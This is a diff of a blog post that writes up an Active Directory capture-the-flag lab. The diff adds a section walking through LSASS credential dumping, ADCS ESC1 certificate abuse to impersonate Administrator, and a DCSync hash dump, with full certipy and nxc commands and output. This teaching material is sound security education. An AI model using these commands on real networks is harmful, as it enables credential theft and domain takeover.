@@ -21,7 +21,7 @@
 {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zavier Lee"},"dateModified":"2025-09-07T00:00:00-04:00","datePublished":"2025-09-07T00:00:00-04:00","headline":"Range Village CTF, September 2025","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/rv-sept.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://0.0.0.0:4000/rv-sept.html"}</script>
 <!-- End Jekyll SEO tag -->
 
-    <link rel="stylesheet" href="/assets/css/style.css?v=75d6e3e17dd82047b78802147b2893447a331b11">
+    <link rel="stylesheet" href="/assets/css/style.css?v=c0f0a1eb168e7e1d142cb9805a4dbd5124b11a27">
     <!--[if lt IE 9]>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
     <![endif]-->
@@ -666,80 +666,11 @@
 
 <h1 id="range-village-ctf-september-2025">Range Village CTF, September 2025</h1>
 
-<p>Last weekend, we sponsored an Active Directory lab that was showcased during the <a href="https://www.meetup.com/div0_sg/events/310625377/">September Range Village Meetup</a>, hosted by <a href="https://www.div0.sg/">Division Zero (Div0)</a> and the <a href="https://www.linkedin.com/company/the-range-village/">Range Village crew</a>. The event was a great success, with close to 40 participants joining us for an evening of learning and fun!</p>
+<p>Last weekend, we partnered with <a href="https://www.linkedin.com/company/the-range-village/">The Range Village</a> and <a href="https://www.div0.sg/">Div0</a> to host an Active Directory lab as part of their <a href="https://www.meetup.com/div0_sg/events/310625377/">September Meetup</a>. The event was a great success, with close to 40 participants joining us for an evening of learning and fun!</p>
+
+<p><img src="./assets/img/rv-sept/1757298089601.jpg" alt="" /></p>
 
 <p>This blog post provides an overview of the lab, including the challenges, statistics, and solutions for each flag. There are multiple solutions for some of the flags, so if you have done the lab - do look out for the alternative methods covered in this post!</p>
-
-<ul>
-  <li><a href="#range-village-ctf-september-2025">Range Village CTF, September 2025</a>
-    <ul>
-      <li><a href="#challenge-overview">Challenge Overview</a></li>
-      <li><a href="#solve-statistics">Solve Statistics</a></li>
-    </ul>
-  </li>
-  <li><a href="#flag-1-and-so-it-begins">Flag 1: And, so it begins…</a>
-    <ul>
-      <li><a href="#path-1-kerberoasting">Path 1: Kerberoasting</a>
-        <ul>
-          <li><a href="#roasting-the-easy-way">Roasting (The Easy Way)</a></li>
-          <li><a href="#roasting-the-hard-way">Roasting (The Hard Way)</a></li>
-        </ul>
-      </li>
-      <li><a href="#path-2-cross-forest-enumeration">Path 2: Cross-Forest Enumeration</a></li>
-      <li><a href="#looting-shares">Looting Shares</a></li>
-    </ul>
-  </li>
-  <li><a href="#flag-2-access-uncontrolled">Flag 2: Access (Un)controlled</a>
-    <ul>
-      <li><a href="#identifying-privileged-groups">Identifying Privileged Groups</a></li>
-      <li><a href="#machineaccountquota">MachineAccountQuota</a></li>
-      <li><a href="#abusing-genericall-on-group">Abusing GenericAll on Group</a></li>
-    </ul>
-  </li>
-  <li><a href="#flag-3-moving-laterally">Flag 3: Moving Laterally</a></li>
-  <li><a href="#flag-4-historical-scar">Flag 4: Historical Scar</a></li>
-  <li><a href="#flag-5-silver">Flag 5: Silver</a>
-    <ul>
-      <li><a href="#path-1-silver-ticket">Path 1: Silver Ticket</a>
-        <ul>
-          <li><a href="#understanding-kerberos">Understanding Kerberos</a></li>
-          <li><a href="#fetching-the-pac">Fetching the PAC</a></li>
-          <li><a href="#forging-tickets">Forging Tickets</a></li>
-          <li><a href="#accessing-mssql-as-administrator">Accessing MSSQL as Administrator</a></li>
-          <li><a href="#local-privilege-escalation">Local Privilege Escalation</a></li>
-        </ul>
-      </li>
-      <li><a href="#path-2-s4u2self">Path 2: S4u2self</a>
-        <ul>
-          <li><a href="#s4u2self-extension">S4u2self Extension</a></li>
-          <li><a href="#accessing-mssql-as-administrator-1">Accessing MSSQL as Administrator</a></li>
-        </ul>
-      </li>
-      <li><a href="#path-3-runas">Path 3: RunAs</a>
-        <ul>
-          <li><a href="#uac-bypass-via-computerdefaultsexe">UAC Bypass via computerdefaults.exe</a></li>
-        </ul>
-      </li>
-      <li><a href="#path-4-adding-svc_sql-to-senior-developers">Path 4: Adding <code class="language-plaintext highlighter-rouge">svc_sql</code> to <code class="language-plaintext highlighter-rouge">senior-developers</code></a></li>
-    </ul>
-  </li>
-  <li><a href="#flag-6-antennae">Flag 6: Antennae</a>
-    <ul>
-      <li><a href="#dumping-lsass">Dumping LSASS</a></li>
-      <li><a href="#dcsync-attack">DCSync Attack</a></li>
-    </ul>
-  </li>
-  <li><a href="#flag-7-privilege-deescalation">Flag 7: Privilege (De)escalation?</a>
-    <ul>
-      <li><a href="#cross-forest-enumeration">Cross-Forest Enumeration</a></li>
-      <li><a href="#finding-foreign-group-memberships">Finding Foreign Group Memberships</a></li>
-      <li><a href="#dcsyncing-natashalim">DCSyncing natasha.lim</a></li>
-      <li><a href="#foreign-maq">Foreign MAQ</a></li>
-      <li><a href="#abusing-genericall-on-group-again">Abusing GenericAll on Group, again</a></li>
-      <li><a href="#local-administrator">Local Administrator</a></li>
-    </ul>
-  </li>
-</ul>
 
 <div class="toc-container">
   <button class="toc-toggle" onclick="toggleToc()">Table of Contents</button>
@@ -753,68 +684,104 @@
         </ul>
       </li>
       <li>
-        <a href="#flag-1-and-so-it-begins">And, so it begins...</a>
+        <a href="#flag-1-and-so-it-begins">Flag 1: And, so it begins...</a>
         <ul>
-            <li><a href="#path-1-kerberoasting">Kerberoasting</a></li>
-                <ul>
-                    <li><a href="#roasting-the-easy-way">Roasting (The Easy Way)</a></li>
-                    <li><a href="#roasting-the-hard-way">Roasting (The Hard Way)</a></li>
-                </ul>
-            <li><a href="#path-2-cross-forest-enumeration">Cross-Forest Enumeration</a></li>
-            <li><a href="#looting-shares">Looting Shares</a></li>
-        </ul>
-      </li>
-      <li>
-        <a href="#flag-2-access-uncontrolled">Access (Un)controlled</a>
+          <li><a href="#path-1-kerberoasting">Path 1: Kerberoasting</a>
             <ul>
-                <li><a href="#identifying-privileged-groups">Identifying Privileged Groups</a></li>
-                <li><a href="#machineaccountquota">MachineAccountQuota</a></li>
-                <li><a href="#abusing-genericall-on-group">Abusing GenericAll on Group</a></li>
+              <li><a href="#roasting-the-easy-way">Roasting (The Easy Way)</a></li>
+              <li><a href="#roasting-the-hard-way">Roasting (The Hard Way)</a></li>
             </ul>
+          </li>
+          <li><a href="#path-2-cross-forest-enumeration">Path 2: Cross-Forest Enumeration</a></li>
+          <li><a href="#looting-shares">Looting Shares</a></li>
+        </ul>
       </li>
       <li>
-        <a href="#flag-3-moving-laterally">Moving Laterally</a>
-      </li>
-      <li>
-        <a href="#flag-4-historical-scar">Historical Scar</a>
-      </li>
-      <li>
-        <a href="#flag-5-silver">Silver</a>
+        <a href="#flag-2-access-uncontrolled">Flag 2: Access (Un)controlled</a>
         <ul>
-          <li><a href="#path-1-silver-ticket">Path 1: Silver Ticket</a></li>
-          <ul>
-            <li><a href="#understanding-kerberos">Understanding Kerberos</a></li>
-            <li><a href="#fetching-the-pac">Fetching the PAC</a></li>
-            <li><a href="#forging-tickets">Forging Tickets</a></li>
-            <li><a href="#accessing-mssql-as-administrator">Accessing MSSQL as Administrator</a></li>
-            <li><a href="#local-privilege-escalation">Local Privilege Escalation</a></li>
-          </ul>
-          <li><a href="#path-2-s4u2self">Path 2: S4u2self</a></li>
-          <ul>
-            <li><a href="#s4u2self-extension">S4u2self Extension</a></li>
-            <li><a href="#accessing-mssql-as-administrator-1">Accessing MSSQL as Administrator</a></li>
+          <li><a href="#identifying-privileged-groups">Identifying Privileged Groups</a></li>
+          <li><a href="#machineaccountquota">MachineAccountQuota</a></li>
+          <li><a href="#abusing-genericall-on-group">Abusing GenericAll on Group</a></li>
         </ul>
-          <li><a href="#path-3-runas">Path 3: RunAs</a></li>
-          <ul>
-            <li><a href="#uac-bypass-via-computerdefaultsexe">UAC Bypass via computerdefaults.exe</a></li>
-          </ul>
-          <li><a href="#path-4-adding-svc_sql-to-senior-developers">Path 4: Adding svc_sql to senior-developers</a></li>
-        </ul>
-        </li>
-      <li>
-        <a href="#flag-6-antennae">Antennae</a>
       </li>
-      <ul>
-        <li><a href="#dumping-lsass">Dumping LSASS</a></li>
-        <li><a href="#dcsync-attack">DCSync Attack</a></li>
-      </ul>
       <li>
-        <a href="#flag-7-privilege-deescalation">Privilege (De)escalation?</a>
+        <a href="#flag-3-moving-laterally">Flag 3: Moving Laterally</a>
+      </li>
+      <li>
+        <a href="#flag-4-historical-scar">Flag 4: Historical Scar</a>
+      </li>
+      <li>
+        <a href="#flag-5-silver">Flag 5: Silver</a>
+        <ul>
+          <li><a href="#path-1-silver-ticket">Path 1: Silver Ticket</a>
+            <ul>
+              <li><a href="#understanding-kerberos">Understanding Kerberos</a></li>
+              <li><a href="#fetching-the-pac">Fetching the PAC</a></li>
+              <li><a href="#forging-tickets">Forging Tickets</a></li>
+              <li><a href="#accessing-mssql-as-administrator">Accessing MSSQL as Administrator</a></li>
+              <li><a href="#local-privilege-escalation">Local Privilege Escalation</a></li>
+            </ul>
+          </li>
+          <li><a href="#path-2-s4u2self">Path 2: S4u2self</a>
+            <ul>
+              <li><a href="#s4u2self-extension">S4u2self Extension</a></li>
+              <li><a href="#accessing-mssql-as-administrator-1">Accessing MSSQL as Administrator</a></li>
+            </ul>
+          </li>
+          <li><a href="#path-3-runas">Path 3: RunAs</a>
+            <ul>
+              <li><a href="#uac-bypass-via-computerdefaultsexe">UAC Bypass via computerdefaults.exe</a></li>
+            </ul>
+          </li>
+          <li><a href="#path-4-adding-svc_sql-to-senior-developers">Path 4: Adding `svc_sql` to `senior-developers`</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#flag-6-antennae">Flag 6: Antennae</a>
+        <ul>
+          <li><a href="#dumping-lsass">Dumping LSASS</a></li>
+          <li><a href="#dcsync-attack">DCSync Attack</a></li>
+        </ul>
+      </li>
+      <li>
+        <a href="#flag-7-privilege-deescalation">Flag 7: Privilege (De)escalation?</a>
         <ul>
           <li><a href="#cross-forest-enumeration">Cross-Forest Enumeration</a></li>
           <li><a href="#finding-foreign-group-memberships">Finding Foreign Group Memberships</a></li>
+          <li><a href="#dcsyncing-natashalim">DCSyncing natasha.lim</a></li>
+          <li><a href="#foreign-maq">Foreign MAQ</a></li>
+          <li><a href="#abusing-genericall-on-group-again">Abusing GenericAll on Group, again</a></li>
+          <li><a href="#local-administrator">Local Administrator</a></li>
         </ul>
       </li>
+      <li>
+        <a href="#flag-8-backward">Flag 8: Backward</a>
+        <ul>
+          <li><a href="#dumping-lsass-again">Dumping LSASS, again</a></li>
+          <li><a href="#active-directory-certificate-services-adcs">Active Directory Certificate Services (ADCS)</a></li>
+          <li><a href="#enumerating-certificate-templates">Enumerating Certificate Templates</a></li>
+          <li><a href="#using-templates">Using Templates</a></li>
+          <li><a href="#path-1-esc1">Path 1: ESC1</a>
+            <ul>
+              <li><a href="#enrolling-for-backwarduser">Enrolling for BackwardUser</a></li>
+            </ul>
+          </li>
+          <li><a href="#path-2-esc4">Path 2: ESC4</a>
+            <ul>
+              <li><a href="#abusing-full-control">Abusing Full Control</a></li>
+              <li><a href="#cleanup">Cleanup</a></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li><a href="#behind-the-scenes">Behind the Scenes</a>
+        <ul>
+          <li><a href="#a-common-theme">A Common Theme</a></li>
+          <li><a href="#environment-checking">Environment Checking</a></li>
+          <li><a href="#ldap-modifications">LDAP Modifications</a></li>
+        </ul>
+      </li>
+      <li><a href="#summary">Summary</a></li>
     </ol>
   </div>
 </div>
@@ -2060,11 +2027,11 @@ INFO: Compressing output into 20250907125945_bloodhound.zip
 
 <p>We can enumerate for foreign group memberships using the <code class="language-plaintext highlighter-rouge">Queries</code> tab in <code class="language-plaintext highlighter-rouge">BloodHound</code>. This is a built-in query, labelled as: <code class="language-plaintext highlighter-rouge">Principals with foreign domain group membership</code>. We’ll find that <code class="language-plaintext highlighter-rouge">natasha.lim@antennae.rv</code> is a member of the <code class="language-plaintext highlighter-rouge">Maintainers</code> group in <code class="language-plaintext highlighter-rouge">backward.rv</code>.</p>
 
-<p><img src="./assets/img/rv-sept/ntlm.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/ntlm.png" alt="" /></p>
 
 <p>Additionally, we’ll find that the <code class="language-plaintext highlighter-rouge">Maintainers</code> group has <code class="language-plaintext highlighter-rouge">GenericAll</code> permissions on the <code class="language-plaintext highlighter-rouge">Sysadmins</code> group in <code class="language-plaintext highlighter-rouge">backward.rv</code>.</p>
 
-<p><img src="./assets/img/rv-sept/sysadmins.png" alt="" /></p>
+<p><img src="/assets/img/rv-sept/sysadmins.png" alt="" /></p>
 
 <h2 id="dcsyncing-natashalim">DCSyncing natasha.lim</h2>
 
@@ -2142,6 +2109,597 @@ backward\gatari$
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\gatari$&gt; cat C:\Users\Administrator\Desktop\flag7.txt
 RV{f0r3I6n_GRoUP_mEMBeRSH1p_!$_pR3t7Y_4nNoyin9_549d3e2a7fd475283f4ce5f93f489a76}
 </code></pre></div></div>
+
+<h1 id="flag-8-backward">Flag 8: Backward</h1>
+
+<p><img src="./assets/img/rv-sept/8.png" alt="" /></p>
+
+<p>After compromising <code class="language-plaintext highlighter-rouge">srv01.backward.rv</code>, we can do the same credential dumping technique as shown in <a href="#flag-6-antennae">Flag 6: Antennae</a> to dump the <code class="language-plaintext highlighter-rouge">LSASS</code> process.</p>
+
+<h2 id="dumping-lsass-again">Dumping LSASS, again</h2>
+
+<p>Previously, we used <a href="https://github.com/gentilkiwi/mimikatz">mimikatz.exe</a>, but we can also use the <a href="https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-lsass">lsassy</a> module from <code class="language-plaintext highlighter-rouge">nxc</code> to do the same. We’ll find the <code class="language-plaintext highlighter-rouge">NTLM</code> hash of <code class="language-plaintext highlighter-rouge">iqbal.hassan</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb srv01.backward.rv -u 'gatari$' -p 'P@ssw0rd' -M lsassy
+SMB         10.5.10.13      445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:backward.rv) (signing:True) (SMBv1:False)
+SMB         10.5.10.13      445    SRV01            [+] backward.rv\gatari$:P@ssw0rd (Pwn3d!)
+LSASSY      10.5.10.13      445    SRV01            Saved 16 Kerberos ticket(s) to /home/kali/.nxc/modules/lsassy
+LSASSY      10.5.10.13      445    SRV01            backward\iqbal.hassan dfd368bc95bd217c04415fed81c8933e
+</code></pre></div></div>
+
+<p>We can verify that these credentials are valid for the domain with <code class="language-plaintext highlighter-rouge">nxc</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'iqbal.hassan' -H 'dfd368bc95bd217c04415fed81c8933e'                                
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:backward.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] backward.rv\iqbal.hassan:dfd368bc95bd217c04415fed81c8933e 
+</code></pre></div></div>
+
+<h2 id="active-directory-certificate-services-adcs">Active Directory Certificate Services (ADCS)</h2>
+
+<p>In modern Active Directory environments, it’s common to find <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview">Active Directory Certificate Services (ADCS)</a> deployed. ADCS is often used internally for issuing certificates for various purposes, such as provisioning <code class="language-plaintext highlighter-rouge">TLS</code> certificates for web servers - and these certificates <a href="https://techcommunity.microsoft.com/blog/sqlserver/step-by-step-guide-to-setup-ldaps-on-windows-server/385362">are also used for <code class="language-plaintext highlighter-rouge">LDAPS</code> (LDAP over SSL/TLS) connections</a>.</p>
+
+<p>We can enumerate for the presence of <code class="language-plaintext highlighter-rouge">ADCS</code> by looking for the <code class="language-plaintext highlighter-rouge">pKIEnrollmentService</code> object class in <code class="language-plaintext highlighter-rouge">LDAP</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'iqbal.hassan' -H 'dfd368bc95bd217c04415fed81c8933e' --query "(objectClass=pKIEnrollmentService)" "cn dNSHostName" --base-dn 'CN=Configuration,DC=backward,DC=rv' 
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:backward.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] backward.rv\iqbal.hassan:dfd368bc95bd217c04415fed81c8933e 
+LDAP        10.5.10.12      389    DC02             [+] Response for object: CN=BACKWARD-ENTERPRISE-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=backward,DC=rv
+LDAP        10.5.10.12      389    DC02             cn                   BACKWARD-ENTERPRISE-CA
+LDAP        10.5.10.12      389    DC02             dNSHostName          DC02.backward.rv
+</code></pre></div></div>
+
+<p>We’ll find that <code class="language-plaintext highlighter-rouge">ADCS</code> is deployed in <code class="language-plaintext highlighter-rouge">backward.rv</code>, with the <code class="language-plaintext highlighter-rouge">Certificate Authority (CA)</code> role installed on <code class="language-plaintext highlighter-rouge">dc02.backward.rv</code>. Additionally, the <code class="language-plaintext highlighter-rouge">Common Name (CN)</code> of the <code class="language-plaintext highlighter-rouge">CA</code> is <code class="language-plaintext highlighter-rouge">BACKWARD-ENTERPRISE-CA</code>.</p>
+
+<h2 id="enumerating-certificate-templates">Enumerating Certificate Templates</h2>
+
+<p>The “go-to” tool for <code class="language-plaintext highlighter-rouge">ADCS</code> enumeration is <a href="https://github.com/ly4k/Certipy">certipy</a>, we can use this to list all the certificate templates that are available for enrollment:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy find -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -stdout -enabled | grep 'Template Name' | awk -F': ' '{print $2}'
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+BackwardDev
+BackwardUser
+KerberosAuthentication
+DirectoryEmailReplication
+DomainControllerAuthentication
+SubCA
+WebServer
+DomainController
+Machine
+EFSRecovery
+Administrator
+EFS
+User
+</code></pre></div></div>
+
+<p>Most of these templates are enabled by default, such as <code class="language-plaintext highlighter-rouge">User</code>, <code class="language-plaintext highlighter-rouge">Machine</code>, and <code class="language-plaintext highlighter-rouge">DomainController</code>. However, there are some non-default templates that are also enabled, such as <code class="language-plaintext highlighter-rouge">BackwardDev</code> and <code class="language-plaintext highlighter-rouge">BackwardUser</code>.</p>
+
+<h2 id="using-templates">Using Templates</h2>
+
+<p>Templates with the <code class="language-plaintext highlighter-rouge">Client Authentication</code> purpose can be used to authenticate to services, similar to how we did earlier with plaintext credentials. An example of such a template is the <code class="language-plaintext highlighter-rouge">User</code> built-in template:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy find -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -stdout -enabled
+
+[...snip...]
+
+  12
+    Template Name                       : User
+    Display Name                        : User
+    Certificate Authorities             : BACKWARD-ENTERPRISE-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectAltRequireEmail
+                                          SubjectRequireEmail
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Encrypting File System
+                                          Secure Email
+                                          Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-08-30T08:43:21+00:00
+    Template Last Modified              : 2025-08-30T08:43:21+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : BACKWARD.RV\Domain Admins
+                                          BACKWARD.RV\Domain Users
+                                          BACKWARD.RV\Enterprise Admins
+      Object Control Permissions
+        Owner                           : BACKWARD.RV\Enterprise Admins
+        Full Control Principals         : BACKWARD.RV\Domain Admins
+                                          BACKWARD.RV\Enterprise Admins
+        Write Owner Principals          : BACKWARD.RV\Domain Admins
+                                          BACKWARD.RV\Enterprise Admins
+        Write Dacl Principals           : BACKWARD.RV\Domain Admins
+                                          BACKWARD.RV\Enterprise Admins
+        Write Property Enroll           : BACKWARD.RV\Domain Admins
+                                          BACKWARD.RV\Domain Users
+                                          BACKWARD.RV\Enterprise Admins
+    [+] User Enrollable Principals      : BACKWARD.RV\Domain Users
+
+[...snip...]
+</code></pre></div></div>
+
+<p>By default, all domain users can enroll for this template. We can use <code class="language-plaintext highlighter-rouge">certipy</code> to request a certificate for the <code class="language-plaintext highlighter-rouge">iqbal.hassan</code> user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy req -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -ca 'BACKWARD-ENTERPRISE-CA' -template 'User'                     
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: dc02.backward.rv.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 4
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'iqbal.hassan@backward.rv'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'iqbal.hassan.pfx'
+[*] Wrote certificate and private key to 'iqbal.hassan.pfx'
+</code></pre></div></div>
+
+<p>This <code class="language-plaintext highlighter-rouge">PFX</code> file contains both the certificate and the private key, which we can use to authenticate to services that support <code class="language-plaintext highlighter-rouge">PKI (Public Key Infrastructure)</code> authentication, such as <code class="language-plaintext highlighter-rouge">LDAP</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'iqbal.hassan' --pfx-cert iqbal.hassan.pfx -M whoami
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:backward.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] backward.rv\iqbal.hassan:dfd368bc95bd217c04415fed81c8933e 
+WHOAMI      10.5.10.12      389    DC02             Name: Iqbal Hassan
+WHOAMI      10.5.10.12      389    DC02             sAMAccountName: iqbal.hassan
+WHOAMI      10.5.10.12      389    DC02             Enabled: Yes
+WHOAMI      10.5.10.12      389    DC02             Password Never Expires: No
+WHOAMI      10.5.10.12      389    DC02             Last logon: 2025-09-08 15:18:05 UTC
+WHOAMI      10.5.10.12      389    DC02             Password Last Set: 2025-08-28 19:17:07 UTC
+WHOAMI      10.5.10.12      389    DC02             Bad Password Count: 0
+WHOAMI      10.5.10.12      389    DC02             Distinguished Name: CN=Iqbal Hassan,CN=Users,DC=backward,DC=rv
+WHOAMI      10.5.10.12      389    DC02             Member of: CN=CA-Test,CN=Users,DC=backward,DC=rv
+WHOAMI      10.5.10.12      389    DC02             User SID: S-1-5-21-2163652167-2436585246-2491459670-1109
+</code></pre></div></div>
+
+<h2 id="path-1-esc1">Path 1: ESC1</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">BackwardUser</code> template is a custom template that was created in this environment. It has the <code class="language-plaintext highlighter-rouge">Client Authentication</code> purpose, and the <code class="language-plaintext highlighter-rouge">iqbal.hassan</code> user is allowed to enroll for it:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy find -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -stdout -enabled | grep 'BackwardUser' -A 20
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+    Template Name                       : BackwardUser
+    Display Name                        : Backward User
+    Certificate Authorities             : BACKWARD-ENTERPRISE-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-08-30T08:43:39+00:00
+    Template Last Modified              : 2025-08-30T08:43:40+00:00
+</code></pre></div></div>
+
+<p>If we compare this to the <code class="language-plaintext highlighter-rouge">User</code> template, we’ll notice that the <code class="language-plaintext highlighter-rouge">Enrollee Supplies Subject</code> property is set to <code class="language-plaintext highlighter-rouge">True</code>. This means that the user can specify the <code class="language-plaintext highlighter-rouge">Subject</code> of the certificate, which includes the <code class="language-plaintext highlighter-rouge">Common Name (CN)</code> and <code class="language-plaintext highlighter-rouge">User Principal Name (UPN)</code>.</p>
+
+<p>This misconfiguration is critical, as it allows any user to enroll for a certificate but specifying the <code class="language-plaintext highlighter-rouge">Subject</code> as any other user in the domain. The “Supply in the request” option is often used in scenarios where the certificate requester needs to specify a particular identity, such as when a service account or application requires a certificate with a specific <code class="language-plaintext highlighter-rouge">Common Name (CN)</code> or <code class="language-plaintext highlighter-rouge">User Principal Name (UPN)</code> that differs from the requester’s own identity.</p>
+
+<p><img src="./assets/img/rv-sept/esc1.png" alt="" /></p>
+
+<p>It is worth mentioning that when attempting to check this box, a warning message is displayed. As a result, you really do need to intentionally select this option and ignore the security warning. Despite the warning, this is <a href="https://api.managed.entrust.com/csp/1.0.0/Enabling-supply-in-the-request.html">still a common configuration setting</a> that is required by some applications.</p>
+
+<blockquote>
+  <p>And yet, <code class="language-plaintext highlighter-rouge">ESC1</code> is the most common misconfiguration encountered in <code class="language-plaintext highlighter-rouge">ADCS</code> environments.</p>
+</blockquote>
+
+<p><img src="./assets/img/rv-sept/esc1-2.png" alt="" /></p>
+
+<h3 id="enrolling-for-backwarduser">Enrolling for BackwardUser</h3>
+
+<p>We can use <code class="language-plaintext highlighter-rouge">certipy</code> to request a certificate for the <code class="language-plaintext highlighter-rouge">iqbal.hassan</code> user, but artificially setting the <code class="language-plaintext highlighter-rouge">userPrincipalName (UPN)</code> to <code class="language-plaintext highlighter-rouge">Administrator@backward.rv</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy req -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -ca 'BACKWARD-ENTERPRISE-CA' -upn 'Administrator@backward.rv' -template 'BackwardUser' 
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: dc02.backward.rv.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 11
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@backward.rv'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+</code></pre></div></div>
+
+<p>We can then use this <code class="language-plaintext highlighter-rouge">PFX</code> file to authenticate to <code class="language-plaintext highlighter-rouge">LDAP</code> as <code class="language-plaintext highlighter-rouge">Administrator</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'Administrator' --pfx-cert administrator.pfx         
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:backward.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] backward.rv\Administrator:d0e0677333c1c1e80a537d580b158509 (Pwn3d!)
+</code></pre></div></div>
+
+<p>As we did earlier in <a href="#dcsync-attack">DCSync Attack</a>, we can use <code class="language-plaintext highlighter-rouge">nxc</code> to perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack to obtain the <code class="language-plaintext highlighter-rouge">NTLM</code> hash of the <code class="language-plaintext highlighter-rouge">Administrator</code> user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc smb dc02.backward.rv -u 'Administrator' --pfx-cert administrator.pfx --ntds --user 'Administrator'
+SMB         10.5.10.12      445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:backward.rv) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         10.5.10.12      445    DC02             [+] backward.rv\Administrator:d0e0677333c1c1e80a537d580b158509 (Pwn3d!)
+SMB         10.5.10.12      445    DC02             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.5.10.12      445    DC02             Administrator:500:aad3b435b51404eeaad3b435b51404ee:d0e0677333c1c1e80a537d580b158509:::
+</code></pre></div></div>
+
+<p>And lastly, we can use these credentials with <code class="language-plaintext highlighter-rouge">evil-winrm</code> to grab the final flag on <code class="language-plaintext highlighter-rouge">dc02.backward.rv</code>:</p>
+
